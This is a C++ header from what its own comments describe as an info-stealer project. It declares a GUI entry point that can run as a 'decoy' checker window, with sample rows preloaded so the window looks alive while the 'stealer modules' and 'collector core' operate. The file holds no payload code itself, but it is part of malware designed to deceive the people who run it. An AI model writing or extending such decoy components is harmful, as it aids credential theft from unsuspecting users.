#pragma once
// GUI entry point. The checker UI is fully decoupled from the collector core:
//   - standalone: src/checker_main.cpp calls gui::run()
//   - embedded (decoy): main.cpp calls gui::run() when cfg::GUI_MODE == "checker"
// The stealer modules are unaffected either way.
#include <windows.h>

namespace gui {

// Runs the message loop until the window closes. decoy=true preloads sample
// rows so the window looks alive from the first second.
int run(HINSTANCE instance, bool decoy);

} // namespace gui
